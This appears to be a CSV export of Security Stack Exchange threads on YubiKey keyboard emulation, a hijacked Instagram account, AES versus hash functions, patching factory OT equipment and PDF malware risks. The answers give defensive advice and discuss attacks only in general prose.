","20","5","260480","<p>The type of input you're seeing is common on YubiKeys, where the USB HID keyboard emulation is used to send one-time passwords (the OTP mode of a YubiKey).  This is because all modern operating systems have basic, built-in support for certain types of standard USB devices, and human-interface devices, like keyboards and mice, are one of those kinds.  Thus, it's possible to support this mode on pretty much any device with a suitable USB port without the need for additional drivers.  (However, it doesn't work with some keyboard layouts, such as Dvorak.)</p>
<p>On the other hand, the FIDO2 code generally needs additional driver and library support, and therefore isn't universally available.  It is, however, more secure.  Which mode to use depends on the security needs of a particular context.</p>
<p>There are definitely other FIDO2 fobs out there, such as the SoloKey.  Its documentation doesn't reference supporting to OTP mode, so if you're really concerned, that may be an alternate option.  If you just find the accidental typing option annoying, YubiKey provides the YubiKey Manager, which lets you turn it off.</p>
<p>Everything in security involves a threat model and tradeoffs.  Personally, I find the risk of being compromised due to the YubiKey I personally bought being rogue to be very low.  Shipping intentionally compromised fobs would likely put YubiCo out of business, and they seem to generally be a reputable actor.  As a consequence, I am willing to use their fobs, believing them to be secure, and if the fob is secure, then the keyboard input functionality is not a concern.  (I agree that accidentally triggering it is an annoyance, which is why I turn that off, though.)</p>
","11"
"260474","260474","Why do some FIDO security fobs use keyboard emulation mode?","<p>I was troubled from the very beginning by the fact that my U2F security fob acts as a keyboard and theoretically is able to press any key when no one is looking. Sometimes I accidentally touch it and then screen goes mad because of all those keystrokes. It seems to me a pretty bad design choice.</p>
<p>I was <a href=""https://support.yubico.com/hc/en-us/articles/360013790279-The-YubiKey-as-a-Keyboard"" rel=""noreferrer"">reading article by YubiCo</a> with justifications and not much of it makes sense. It says that it’s because of drivers, but following the same logic such a security key can be just a read-only flash drive with some added extra sauce on top for key management without any keyboard jazz.</p>
<p>So why keyboard emulation? Are there any alternative fobs taking a less spooky approach?</p>
","20","5","260502","<p>Sounds like you have a YubiKey NEO or later, which provides <em>multiple</em> unrelated functions over the same USB connection – the &quot;keyboard&quot; emulation <strong>is not for U2F</strong>, it's for Yubikey's 'original' One-time Password function which predates U2F by about a decade.</p>
<p>(Some models also have a third interface, acting as a PIV-format smartcard.)</p>
<p>You can disable the OTP interface in a Yubikey using either the graphical <a href=""https://docs.yubico.com/software/yubikey/tools/ykman/Using_the_ykman_GUI.html#managing-interfaces"" rel=""noreferrer"">YubiKey Manager</a> app, or the <a href=""https://docs.yubico.com/software/yubikey/tools/ykman/Base_Commands.html#ykman-config-mode-options-mode"" rel=""noreferrer""><code>ykman</code></a> CLI tool, or the older <code>ykpersonalize</code> CLI tool:</p>
<pre><code>ykman config mode FIDO

ykpersonalize -m3
</code></pre>
<p>(This will not erase the factory keys, only hide the 'keyboard' HID interface.)</p>
","11"
"260474","260474","Why do some FIDO security fobs use keyboard emulation mode?","<p>I was troubled from the very beginning by the fact that my U2F security fob acts as a keyboard and theoretically is able to press any key when no one is looking. Sometimes I accidentally touch it and then screen goes mad because of all those keystrokes. It seems to me a pretty bad design choice.</p>
<p>I was <a href=""https://support.yubico.com/hc/en-us/articles/360013790279-The-YubiKey-as-a-Keyboard"" rel=""noreferrer"">reading article by YubiCo</a> with justifications and not much of it makes sense. It says that it’s because of drivers, but following the same logic such a security key can be just a read-only flash drive with some added extra sauce on top for key management without any keyboard jazz.</p>
<p>So why keyboard emulation? Are there any alternative fobs taking a less spooky approach?</p>
","20","5","260504","<p>To add to the other answers, a Yubikey generally cannot emulate a different device other than a HID, such as a mass storage device as you suggested. Many large organizations deploy policies that prevent the use of removable mass storage devices by users in order to help thwart data loss. Those policies are intended to prevent a malicious user (or Bad USB cable) from downloading sensitive files locally. They also protect against users plugging in “found USB keys” that upload malware.</p>
<p>When such a policy is enabled, the OS will see that a new USB device is a mass storage device and will refuse to mount it. A Yubikey would be inert if it was emulating a thumb drive.</p>
<p>But unknown HID devices (like new keyboards) are almost always allowed because of accessibility issues. For example, if a person requires a specialized large button keyboard, a US employer is required by the ADA to permit them to use it so they can do their job.</p>
<p><strong>EDIT</strong>: HID devices are considered “mostly safe”. Since they are input-only, they cannot directly exfiltrate data from the host. However, malicious HID devices such as the Bash Bunny can send keystrokes that will attempt to open a browser, download a program, run it, upload a file full of results, then close the browser. But your suggestion of restricting unknown HID devices is not a useful defense, as the Bash Bunny can also present the PID &amp; VID of a stock Dell keyboard, or whatever keyboard you think should be on a whitelist. At some point, you have to accept some risk when you allow HID.</p>
<p>There are some very high security systems that have specialty keyboard devices dedicated to secure password entry. For example HSM vendors often use an encrypted keypad for initializing security keys. But these are not HID-compliant keypads, they are separate embedded systems with a little display that prompts users for input, they do internal cryptography, then exchange encrypted data via the USB serial protocol. They may even require custom drivers to function. These are designed with nation-state level adversaries in mind.</p>
","6"
"260474","260474","Why do some FIDO security fobs use keyboard emulation mode?","<p>I was troubled from the very beginning by the fact that my U2F security fob acts as a keyboard and theoretically is able to press any key when no one is looking. Sometimes I accidentally touch it and then screen goes mad because of all those keystrokes. It seems to me a pretty bad design choice.</p>
<p>I was <a href=""https://support.yubico.com/hc/en-us/articles/360013790279-The-YubiKey-as-a-Keyboard"" rel=""noreferrer"">reading article by YubiCo</a> with justifications and not much of it makes sense. It says that it’s because of drivers, but following the same logic such a security key can be just a read-only flash drive with some added extra sauce on top for key management without any keyboard jazz.</p>
<p>So why keyboard emulation? Are there any alternative fobs taking a less spooky approach?</p>
","20","5","260549","<p>Keyboard emulation is a <strong>legacy feature, retained for backward compatibility</strong>.</p>
<p>Yubikey <a href=""https://www.yubico.com/about/yubico-innovation-history/"" rel=""nofollow noreferrer"">created their product in ~2007</a> - years before the introduction of FIDO/U2F (~2014) and at that time, emulating a USB keyboard was the only way to make their product work without drivers or browser plugins. [*]</p>
<p>This was before there were controls on plugging in USB keyboards - in those days, malicious USB devices would simply <a href=""https://www.csoonline.com/article/2123768/after-cert-warning--microsoft-delivers-autorun-fix.html"" rel=""nofollow noreferrer"">use autorun.inf to execute the attack directly</a> (possibly by emulating a CD-ROM drive)</p>
<p>In modern times, it's doubtful anyone would develop a <em>new</em> application that relied on USB keyboard emulation - but Yubikey keep it around to support their long-term customers.</p>
<p>You can disable the USB keyboard emulation on your Yubikey with their administrator tools - or you can buy a different model (the <a href=""https://www.yubico.com/products/security-key/"" rel=""nofollow noreferrer"">blue yubikey</a> is U2F-only) or from a different vendor entirely.</p>
<p>[*] Technically their product also emulates a smart card reader, but smart cards had achieved little adoption in the market at that time, except in hospitals and the military - nobody was getting rich making smart cards.</p>
","1"
"260372","260372","Friend's Instagram account repeatedly hacked despite changing all information and enabling 2FA","<p>My friends Instagram account has repeatedly been hacked. Someone is gaining access to her account, proceeding to change all the security information to lock her out. Then posts scam ads on her account.</p>
<p>We have the full phone number and email address the hacker is using to change the info to. The country code has the number origin to Nigeria.</p>
<p>We've contacted Instagram 3 times now by sending a video of her proving her identity. Everytime Instagram has unlocked the account for her.</p>
<p>These are the things she's done everytime she's gotten back into the account, but the hacker has somehow regained access, <strong>including by somehow bypassing and deactivating 2FA without 2FA asking for confirmation</strong>!</p>
<ul>
<li>Change phone number back to hers (she has an iPhone)</li>
<li>Change the email address to a completely unrelated separate account.</li>
<li><strong>Added 2FA to her phone number, which the hacker is somehow getting back into the account without triggering a 2FA code to be sent to her phone - we have confirmed the 2FA was setup correctly as it asked her for a code when I attempted to login</strong></li>
<li>Manually logged out all other sessions on the Instagram account.</li>
<li>Changed password to a completely random string of characters (includes letters of varying case, numbers, and symbols)</li>
<li>Password of the old email account was also changed, before then completely changing the email address for the Instagram account.</li>
</ul>
<p>Somehow the attacker has regained access everytime and has locked my friend out. We're unsure how the attacker is still gaining access, especially with all the info changed (except the username and phone number) and 2FA being enabled. All info on the account gets replaced by the attacker, including 2FA being disabled (we also know that the attacker is also re-enabling 2FA on their device afterwards).</p>
<p>I remember reading years ago about how some attackers had gained access to intercept/receive all messages on someone's phone, thus allowing them to take control of their social media (I don't recall who, but I believe it was a famous tech figure such as Zuckerburg). Perhaps a little far-fetched here as there's nothing significant about the Instagram account (few hundred followers as it's a personal account). We have tried sending text messages to her phone number, both with iMessage enabled and disabled, and she received them. She also received the 2FA code triggered by me when I attempted to login to the account.</p>
<p>How can we regain access for the last time and securely lock down the account and perhaps lock down whatever route the attacker is using to get in and take control. We're really out of ideas now.</p>
","6","3","261074","<p>Probably either its one of the problems that got already mentioned in the comments, or the source is hidden deeper and her phone or other devices have a virus or similar (spyware, keylogger, stealing cookies (but for changing the data you need a password) etc) with which the hacker could regain access to her account.</p>
","2"
"260372","260372","Friend's Instagram account repeatedly hacked despite changing all information and enabling 2FA","<p>My friends Instagram account has repeatedly been hacked. Someone is gaining access to her account, proceeding to change all the security information to lock her out. Then posts scam ads on her account.</p>
<p>We have the full phone number and email address the hacker is using to change the info to. The country code has the number origin to Nigeria.</p>
<p>We've contacted Instagram 3 times now by sending a video of her proving her identity. Everytime Instagram has unlocked the account for her.</p>
<p>These are the things she's done everytime she's gotten back into the account, but the hacker has somehow regained access, <strong>including by somehow bypassing and deactivating 2FA without 2FA asking for confirmation</strong>!</p>
<ul>
<li>Change phone number back to hers (she has an iPhone)</li>
<li>Change the email address to a completely unrelated separate account.</li>
<li><strong>Added 2FA to her phone number, which the hacker is somehow getting back into the account without triggering a 2FA code to be sent to her phone - we have confirmed the 2FA was setup correctly as it asked her for a code when I attempted to login</strong></li>
<li>Manually logged out all other sessions on the Instagram account.</li>
<li>Changed password to a completely random string of characters (includes letters of varying case, numbers, and symbols)</li>
<li>Password of the old email account was also changed, before then completely changing the email address for the Instagram account.</li>
</ul>
<p>Somehow the attacker has regained access everytime and has locked my friend out. We're unsure how the attacker is still gaining access, especially with all the info changed (except the username and phone number) and 2FA being enabled. All info on the account gets replaced by the attacker, including 2FA being disabled (we also know that the attacker is also re-enabling 2FA on their device afterwards).</p>
<p>I remember reading years ago about how some attackers had gained access to intercept/receive all messages on someone's phone, thus allowing them to take control of their social media (I don't recall who, but I believe it was a famous tech figure such as Zuckerburg). Perhaps a little far-fetched here as there's nothing significant about the Instagram account (few hundred followers as it's a personal account). We have tried sending text messages to her phone number, both with iMessage enabled and disabled, and she received them. She also received the 2FA code triggered by me when I attempted to login to the account.</p>
<p>How can we regain access for the last time and securely lock down the account and perhaps lock down whatever route the attacker is using to get in and take control. We're really out of ideas now.</p>
","6","3","261752","<p>I've been having this same issue: my problem wasn't so much getting back into the account it was more so that the hacker could always just lock me out again.</p>
<p>I tried steps from <a href=""https://www.youtube.com/watch?v=6wP425KDDqs"" rel=""nofollow noreferrer"">this video</a> which included removing linked accounts from the accounts centre, which you can find in your settings if you log into Instagram via your browser (perhaps use a laptop).</p>
<p>The video is called &quot;How to recover hacked Instagram account fast 2022&quot; uploaded by 'Ariellevate'.</p>
","1"
"260372","260372","Friend's Instagram account repeatedly hacked despite changing all information and enabling 2FA","<p>My friends Instagram account has repeatedly been hacked. Someone is gaining access to her account, proceeding to change all the security information to lock her out. Then posts scam ads on her account.</p>
<p>We have the full phone number and email address the hacker is using to change the info to. The country code has the number origin to Nigeria.</p>
<p>We've contacted Instagram 3 times now by sending a video of her proving her identity. Everytime Instagram has unlocked the account for her.</p>
<p>These are the things she's done everytime she's gotten back into the account, but the hacker has somehow regained access, <strong>including by somehow bypassing and deactivating 2FA without 2FA asking for confirmation</strong>!</p>
<ul>
<li>Change phone number back to hers (she has an iPhone)</li>
<li>Change the email address to a completely unrelated separate account.</li>
<li><strong>Added 2FA to her phone number, which the hacker is somehow getting back into the account without triggering a 2FA code to be sent to her phone - we have confirmed the 2FA was setup correctly as it asked her for a code when I attempted to login</strong></li>
<li>Manually logged out all other sessions on the Instagram account.</li>
<li>Changed password to a completely random string of characters (includes letters of varying case, numbers, and symbols)</li>
<li>Password of the old email account was also changed, before then completely changing the email address for the Instagram account.</li>
</ul>
<p>Somehow the attacker has regained access everytime and has locked my friend out. We're unsure how the attacker is still gaining access, especially with all the info changed (except the username and phone number) and 2FA being enabled. All info on the account gets replaced by the attacker, including 2FA being disabled (we also know that the attacker is also re-enabling 2FA on their device afterwards).</p>
<p>I remember reading years ago about how some attackers had gained access to intercept/receive all messages on someone's phone, thus allowing them to take control of their social media (I don't recall who, but I believe it was a famous tech figure such as Zuckerburg). Perhaps a little far-fetched here as there's nothing significant about the Instagram account (few hundred followers as it's a personal account). We have tried sending text messages to her phone number, both with iMessage enabled and disabled, and she received them. She also received the 2FA code triggered by me when I attempted to login to the account.</p>
<p>How can we regain access for the last time and securely lock down the account and perhaps lock down whatever route the attacker is using to get in and take control. We're really out of ideas now.</p>
","6","3","264838","<p>It is possible that your friend has also been SIM-jacked. This is where the attacker is able to get a clone of a SIM card and is able to use it in another phone to receive MFA codes. Sometimes it is surprisingly easy to convince a telecom to activate a new SIM on an account. It may be worth exploring that option by calling the telecom provider and seeing if there are multiple SIMs attached to the account. I have also placed a verbal 4-digit PIN on my phone carrier services as an extra layer of authentication.</p>
<p>Consider where the account password is stored. Is it stored in a password manager? A file stored on a dropbox folder? The icloud keychain? They may be able to find the password if it is not stored securely, or if they are able to access whatever service it is stored on. I highly encourage the use of a password manager and checking out if there is any unauthorized access to other accounts such as dropbox or icloud. If your friend was using a simplistic/re-used password, it is very possible that they are able to access these services.</p>
<p>Also do an anti-virus scan on all the computers and monitor for unusual activity on phones. If possible, it may be worth doing a factory reset on the phone to try and remove any hidden malware.</p>
","0"
"260350","260350","AES Encryption vs hash function with the strong assumption of input size and secure key?","<p>There are plenty of questions about the difference between AES encryption and hash functions.
I read some of them and the general answer is that</p>
<ol>
<li>AES is reversible as long as the key is exposed.</li>
<li>AES has fixed input size and hash does not.</li>
<li>There is a method to make a hash function based on the block cipher.</li>
</ol>
<p>I am curious whether there is a difference between AES encryption and hash function with the strong assumptions as below:</p>
<p>A. The key of the AES is never exposed. (Without knowing the key, I believe there is no possibility of decryption and hence one-way function as a hash)</p>
<p>B. For some applications, the input size is always fixed.</p>
<p>In this case, if someone uses AES encryption as the purpose of hash, do any possible problems exist?</p>
","1","3","260352","<blockquote>
<p>I am curious whether there is a difference between AES encryption and hash function with the...</p>
</blockquote>
<p>Regardless of your assumptions, there is a difference between AES encryption and &quot;hash function.&quot; (BTW, which hash function did you have in mind?)</p>
<p>Encryption and hashing are just fundamentally different functionalities.</p>
<blockquote>
<p>The key of the AES is never exposed. (Without knowing the key...</p>
</blockquote>
<p>How would you use AES as a hash function &quot;without knowing the key&quot;? In order to reproduce the hashes at some later time, you would have to use the same key that was used originally. In order to do that, you would have had to store the key (or &quot;know&quot; the original key some other way).</p>
<blockquote>
<p>For some applications, the input size is always fixed...</p>
</blockquote>
<p>Why does it matter if the input size is fixed? AES has certain modes of operation (e.g., GCM) that allow it to be used on a wide range of input sizes.</p>
<p>It seems like you should be more worried about the <em>output</em> sizes. The output of a hash function is always the same fixed size (e.g., always 32 bytes for SHA256). But the output of AES (e.g., in GCM mode) will be approximately the same size (a little bigger) than the input.</p>
","1"
"260350","260350","AES Encryption vs hash function with the strong assumption of input size and secure key?","<p>There are plenty of questions about the difference between AES encryption and hash functions.
I read some of them and the general answer is that</p>
<ol>
<li>AES is reversible as long as the key is exposed.</li>
<li>AES has fixed input size and hash does not.</li>
<li>There is a method to make a hash function based on the block cipher.</li>
</ol>
<p>I am curious whether there is a difference between AES encryption and hash function with the strong assumptions as below:</p>
<p>A. The key of the AES is never exposed. (Without knowing the key, I believe there is no possibility of decryption and hence one-way function as a hash)</p>
<p>B. For some applications, the input size is always fixed.</p>
<p>In this case, if someone uses AES encryption as the purpose of hash, do any possible problems exist?</p>
","1","3","260365","<p><strong>Short info: AES</strong></p>
<p>AES is a family of permutations like any block cipher. A block cipher has a short block size like AES has 128-bit. In order to operate you need a mode of operation.</p>
<p><strong>Short info: Hash functions</strong></p>
<p>Hash functions are one-way, deterministic, and in some sense have an unpredictable output ( until one calculates). They are mainly built for collision resistance and pre-image resistance (first and second).</p>
<blockquote>
<p>A. The key of the AES is never exposed. (Without knowing the key, I believe there is no possibility of decryption and hence one-way function as a hash)</p>
<p>B. For some applications, the input size is always fixed.
In this case, if someone uses AES encryption as the purpose of hash, do any possible problems exist?</p>
</blockquote>
<ul>
<li><p>The output size is the first problem. For example; for an integrity check, a good 512-bit hash function is enough. With encryption, there is no integrity without a proper mode of operation and those are not part of encryption like CBC-MAC, HMAC, KMAC, NMAC, GCM, Poly1305, etc.</p>
</li>
<li><p>One needs the key to verify, on the other hand, hashing is free. Consider you build a password from a hash function than without the key you can verfity the password. With encrypted passwords, one needs the key to verify.</p>
</li>
<li><p>You want to sign documents and hashing before signing is part of the security since the first true Rabim-signature scheme. How do you consider reducing the size to 256 or 512-bit to sign the document with encryption?</p>
</li>
<li><p>File comparison; one can simply exchange the hash of the files to check the equality; right just 512-bits. Do you want to send the 5GB file encrypted then compared it?</p>
</li>
</ul>
<blockquote>
<p>There is a method to make a hash function based on the block cipher.</p>
</blockquote>
<p>This is Merle-Damgard (MD) based construction that uses block cipher on <a href=""https://en.wikipedia.org/wiki/One-way_compression_function#Davies%E2%80%93Meyer"" rel=""nofollow noreferrer"">Devies-Mayer</a> method to build compression function. Unfortunately, there are two major problems for AES to be used in MD</p>
<ul>
<li>AES has related-key attacks that enable building collision if used in MD</li>
<li>The block size is 128 and this makes the output of the hash function is 128-bit. Not secure enough to find the collisions!</li>
</ul>
","0"
"260350","260350","AES Encryption vs hash function with the strong assumption of input size and secure key?","<p>There are plenty of questions about the difference between AES encryption and hash functions.
I read some of them and the general answer is that</p>
<ol>
<li>AES is reversible as long as the key is exposed.</li>
<li>AES has fixed input size and hash does not.</li>
<li>There is a method to make a hash function based on the block cipher.</li>
</ol>
<p>I am curious whether there is a difference between AES encryption and hash function with the strong assumptions as below:</p>
<p>A. The key of the AES is never exposed. (Without knowing the key, I believe there is no possibility of decryption and hence one-way function as a hash)</p>
<p>B. For some applications, the input size is always fixed.</p>
<p>In this case, if someone uses AES encryption as the purpose of hash, do any possible problems exist?</p>
","1","3","260376","<p>You can actually make a hash function from a cipher using a construction that I've seen before, although I offer an extension (an &quot;optional patch&quot;) to make up for issues that simpler versions have, and I've never seen exactly the patched version. It will even have a fixed output (digest) length. Although the unpatched version also has a maximum input length (or accepts variable input length by giving up fixed output length), the patch addresses this. I really can't ever recommend this approach over anything from the SHA family, especially SHA2 or SHA3 families, but it's possible and as far as I know works well enough.</p>
<h2>To be clear, never do this for anything that matters; use established constructions built on primitives meant to be used this way.</h2>
<p>The construction:</p>
<ul>
<li>Choose a symmetric cipher. The cipher of choice will determine the maximum input size. For example, if it's AES-128, then you're limited to 128 bits of input.</li>
<li>If using a block cipher, choose a mode of operation. In practice everybody I know who did this used DES and ECB, but you could in theory pick AES and use a mode such as CTR or CBC or some such.</li>
<li>If using a cipher or mode of operation that requires an IV, either pick a constant IV or make it an input parameter to the hash (as a salt) and optionally specify a default value.</li>
<li>Pick a constant string. For a block cipher, it should be a multiple of the block size in length (for AES, that means a multiple of 128 bits), and it will determine the output length of the digest. For a stream cipher or stream-like mode of operation such as CTR, the string length will exactly define the output length but doesn't have to be any specific size.</li>
</ul>
<p>The use:</p>
<ol>
<li>Pad the input up to the chosen cipher's key length, using a fixed pattern. In practice people just used null bytes or spaces or something. Optional patch for maximum input length: If the input is longer than the key length, break the input into key-length chunks, padding the last one if needed.</li>
<li>If using a mode that requires an IV and not using a constant IV, generate or pick an IV of the desired size. This will be the &quot;salt&quot;, and for password hashing is stored alongside the digest.</li>
<li>Using the padded input (or the first chunk of input, if using the optional patch) as the key and the chosen cipher, mode (if relevant), and IV (if relevant), encrypt the chosen fixed string.</li>
<li>If there are more input chunks, use the next chunk as the key and the chosen cipher, mode (if relevant), and IV (if relevant) to encrypt the output of the last encryption. Repeat this step until there are no more input chunks.</li>
<li>Use the final ciphertext (which is the output of step #3 if there's only one input chunk) as the digest. If you needed an IV (salt), store the IV along with the ciphertext in the same way that salts are stored with password digests.</li>
</ol>
<p>Written more symbolically:</p>
<ol>
<li>N = CEIL(InputSize / KeySize). k1, k2, ... kN = CHUNK(Input, KeySize). kN = PAD(kN, KeySize)</li>
<li>If IV desired, IV = RAND(IVSize)</li>
<li>c1 = ENCRYPT(Cipher, k1, IV, ConstantString)</li>
<li>For X = 2..N, cX = ENCRYPT(Cipher, kX, IV, c(X-1))</li>
<li>Return cN</li>
</ol>
<p>The principle of the security here is that modern ciphers are strong against <a href=""https://en.wikipedia.org/wiki/Known-plaintext_attack"" rel=""nofollow noreferrer"">known-plaintext attacks</a>. That is, even if you know the plaintext (you do, it's a constant value), and even if you know for some ciphertext what the key used to produce it is (easy; you can input your own key for the cipher and derive a ciphertext), you can't determine the key (hash input) for an <em>arbitrary</em> ciphertext (digest).</p>
<p>I have no idea how collision resistant this is. Although symmetric encryption is a 1:1 function of plaintext to ciphertext (or vice-versa) for a given key and IV, that doesn't inherently mean multiple keys can't produce the same ciphertext from the same plaintext. Obviously such a key is weak, and modern ciphers try to avoid having weak keys, but I'm not sure they're totally successful. Throw the feedback function in there for longer inputs and all bets are off; I really don't have any idea at that point.</p>
<p>The most obvious problem with this scheme is that the input length under consideration at any time is limited to the maximum key length. Using the single-round version that doesn't chunk the input and thus has a maximum input length, that is disqualifying for a general-purpose hash function, and even for a password hashing function, you probably want more than the 32 bytes you could get from AES-256. At least one system I know about attempted to solve this using a broken version of the chunked input where each ciphertext was concatenated instead of fed back in as the next input chunk's message; that is <em>dangerously insecure</em> as it means that the pre-image (the input to the hash) can be brute-forced in key-size chunks. That's not a problem for most of the input chunks with AES - even 128 bits is far too much to brute force - but it's a huge problem for the last part of any input slightly longer than a multiple of the key size as, if the input length is known, that trailing part can be brute-forced easily (it's also a problem for all parts of the 56-bit DES keys that the implementation I saw used). You also face the problem that now the output length isn't fixed anymore, and depends on the input length again, but even using the optional patch, you may be opening yourself to a cryptographic attack by segmenting the key this way. Or possibly by repeated use of encrypt with different keys, such as why 3DES with 112 or 168 bits of key material has less security than its key length suggests.</p>
<p>I'm not a cryptanalyst or theoretical cryptographer to tell you whether that, or anything else, are serious problems with this construction - you might want to ask about this on crypto.stackexchange.com - but I would be pretty surprised if it doesn't have some. This falls right into &quot;don't roll your own crypto&quot;, even if you're technically using existing primitives.</p>
<p>It also quite likely underperforms SHA2 or SHA3 hashes in software, though with hardware AES support it might be quite fast on modern CPUs. Of course, for passwords, you don't <em>want</em> fast; all modern dedicated password hashing algorithms are deliberately and configurably slow, to mitigate brute forcing of the digests. Non-password things could take advantage of that, though.</p>
","0"
"260340","260340","Patching operational technology products in a manufacturing assembly line?","<p>I have recently moved to the manufacturing sector to take care of security of systems/products, specifically <a href=""https://en.wikipedia.org/wiki/Operational_technology"" rel=""noreferrer"">operational technology</a> (OT)  products. Based on a recent US CISA advisory, I had to apply a patch to multiple units of the same series/product from a particular vendor. The products are used in the assembly line for automating certain jobs.</p>
<p>How do I make sure that the new update will not brick the products installed in the assembly line?</p>
<p>Here, what are the best practices to do the patching for these kinds of products which will not disrupt the line? The products could be patched only during the shift changes (3 shifts are going on).</p>
<blockquote>
<p>&quot;Some industrial sectors require 99.999% or greater ICS uptime. This
requirement relates to 5 minutes and 35 seconds or less allowable
downtime per year for any reason, making unscheduled patching out of
the question.&quot;</p>
</blockquote>
<p>This is true to a large extent as unavailability for even a single day is not acceptable.</p>
<p>Also, as the products are very costly, I can't afford to have a standalone unit to check whether the new software update is not bricking the unit and fully compatible.</p>
<p>In this case, should I be asking the supplier of the product or the manufacturer of the product to provide evidences, that the new update is safe to install?</p>
","17","3","260341","<p>Don't touch <em>anything</em> on the line without the vendor providing direct oversight, or even better, doing the work themselves. This should be performed under a support/maintenance contract.</p>
<p>If you cannot test the patch, then you need to transfer the liability to the vendor and be protected by support contracts.</p>
","35"
"260340","260340","Patching operational technology products in a manufacturing assembly line?","<p>I have recently moved to the manufacturing sector to take care of security of systems/products, specifically <a href=""https://en.wikipedia.org/wiki/Operational_technology"" rel=""noreferrer"">operational technology</a> (OT)  products. Based on a recent US CISA advisory, I had to apply a patch to multiple units of the same series/product from a particular vendor. The products are used in the assembly line for automating certain jobs.</p>
<p>How do I make sure that the new update will not brick the products installed in the assembly line?</p>
<p>Here, what are the best practices to do the patching for these kinds of products which will not disrupt the line? The products could be patched only during the shift changes (3 shifts are going on).</p>
<blockquote>
<p>&quot;Some industrial sectors require 99.999% or greater ICS uptime. This
requirement relates to 5 minutes and 35 seconds or less allowable
downtime per year for any reason, making unscheduled patching out of
the question.&quot;</p>
</blockquote>
<p>This is true to a large extent as unavailability for even a single day is not acceptable.</p>
<p>Also, as the products are very costly, I can't afford to have a standalone unit to check whether the new software update is not bricking the unit and fully compatible.</p>
<p>In this case, should I be asking the supplier of the product or the manufacturer of the product to provide evidences, that the new update is safe to install?</p>
","17","3","260384","<p>One system I worked on had a simple solution. To guarantee 5 nines, redundant hardware was used. For patching purposes, a fail-over could be initiated manually. One half of the system was patched, another fail-over was initiated, and then the second half was patched. Patches could be reverted in case of failure, and the impact of the temporarily non-redundant system failing was acceptable (&lt;5 minutes).</p>
<p>Of course, this could be generalized to triple-redundant systems so you can fail-over even during patching. Reliability comes at a price.</p>
","10"
"260340","260340","Patching operational technology products in a manufacturing assembly line?","<p>I have recently moved to the manufacturing sector to take care of security of systems/products, specifically <a href=""https://en.wikipedia.org/wiki/Operational_technology"" rel=""noreferrer"">operational technology</a> (OT)  products. Based on a recent US CISA advisory, I had to apply a patch to multiple units of the same series/product from a particular vendor. The products are used in the assembly line for automating certain jobs.</p>
<p>How do I make sure that the new update will not brick the products installed in the assembly line?</p>
<p>Here, what are the best practices to do the patching for these kinds of products which will not disrupt the line? The products could be patched only during the shift changes (3 shifts are going on).</p>
<blockquote>
<p>&quot;Some industrial sectors require 99.999% or greater ICS uptime. This
requirement relates to 5 minutes and 35 seconds or less allowable
downtime per year for any reason, making unscheduled patching out of
the question.&quot;</p>
</blockquote>
<p>This is true to a large extent as unavailability for even a single day is not acceptable.</p>
<p>Also, as the products are very costly, I can't afford to have a standalone unit to check whether the new software update is not bricking the unit and fully compatible.</p>
<p>In this case, should I be asking the supplier of the product or the manufacturer of the product to provide evidences, that the new update is safe to install?</p>
","17","3","260392","<p>OT is a different world.</p>
<p>First, what schroeder said. You want to contact the vendor and discuss this with them.</p>
<p>You also want to check with plant management regarding any certifications, Health-and-Safety inspections and other stuff that might <strong>become invalid</strong> if <strong>anything</strong> in the system is changed.</p>
<p>You also don't apply patches just because they're there. We do that in IT, because it's usually better to be patched than not. That is not necessarily true in the OT world. In fact, you'll find plenty of outdated systems where the risk analysis came to the conclusion that that's better or that other mitigation measures cover the risk sufficiently.</p>
<p>So no, you never <strong>have to</strong> apply some patch. You always <strong>choose to</strong> do so, based on the vendor recommendations, security/risk analysis and operational requirements.</p>
<p>So, in short, here's what I'd recommend (I am currently acting CISO of a manufacturing plant):</p>
<ol>
<li>be clear <strong>why</strong> you decide to apply that patch, if there are alternatives (such as other mitigations) to doing so and why you discarded those. I strongly recommend having that in writing.</li>
<li>contact the vendor and inform them that you see the need to apply a patch and schedule a discussion with them. <strong>They</strong> are the ones who should check the patch works on their systems and guide you through the patching process itself.</li>
<li>contact plant management and inform them that you want to apply a patch, and that according to the vendor this will cause a downtime of X. Get their approval. Also list the risk that the downtime could be longer than anticipated and have them sign off on that risk.</li>
<li>once everyone who is in any way involved is on board, schedule the maintenance, do all the paperwork, let the vendor come in to handle or at least assist in the actual process, and have a rollback/restore plan ready, just in case.</li>
</ol>
","14"
"260330","260330","Is there a way to scan a pdf to ensure it doesn't contain anything that could be a virus?","<p>The answers to <a href=""https://security.stackexchange.com/q/64052/211696"">Can a PDF file contain a virus?</a> show that clearly it can!</p>
<p>Sometimes we can be quite sure a certain pdf should not need to do anything sophisticated - for example a book in pdf form - so we wouldn't expect them to contain <a href=""https://blog.didierstevens.com/2010/03/29/escape-from-pdf/"" rel=""nofollow noreferrer"">embedded executables</a>, or similarly more complex items, like <a href=""https://security.stackexchange.com/a/94374/211696"">javascripts</a>, and if they did, they could be avoided or treated with extra precaution.</p>
<h3>Question</h3>
<p>Is there a simple way on macOS and Windows to ensure that any URLs ending in <code>.pdf</code> are scanned for anything more complicated than text and images (the things we'd expect to find in, say, a book), and only opened/downloaded/viewed if it passes the check?</p>
<p>Note: I know many harmless pdfs contain some complex behaviours, but I'd prefer to turn the check <em>off</em> for those specific  cases (i.e. if they're from a trusted source), rather than allowing potentially malicious behaviour.</p>
","0","3","260334","<p>Ensure? No. A simple reason: Images, layout information, fonts, and all sorts of other &quot;simple&quot; data can nonetheless be malicious, and can lead to arbitrary code execution if the parser for them has an exploitable bug (a.k.a. a vulnerability). This is not academic; lots of exploits, including some quite famous ones, were carried out through image or font parsers.</p>
<p>Similarly, any scanner that you could use to theoretically validate the contents of a PDF could, itself, be vulnerable. After all, it too is parsing the file, and there's nothing that says security tools can't contain vulnerabilities themselves. In fact, adding a security tool always increases the attack surface - the amount of space where a vulnerability could exist - and there is no way to guarantee that the tool, even if not itself vulnerable, will reliably detect malicious data without passing it on to other code.</p>
<p>You could, in theory, have a PDF reader that doesn't handle any but the most common and trusted formats; it wouldn't be able to open everything (not even every book), but it could open most of them (probably all from most publishers, etc.). It wouldn't be totally safe - even common and trusted code can have vulnerabilities that lurk undetected for over a decade. I don't know of any PDF reader that has this feature (and specific product recommendations are out of scope for this site anyhow), but you might be able to find one if you look.</p>
<p>Another option would be a PDF validator. As mentioned above, this does add attack surface (the validator itself), but in theory a validator could apply strict validation without attempting to render the font/image/layout/whatever, which reduces the risk somewhat, and would probably throw out anything that isn't safe (not guaranteed, but probably) without being at risk itself (unless the validator was software somebody specifically targeted, or was rather shoddily written).</p>
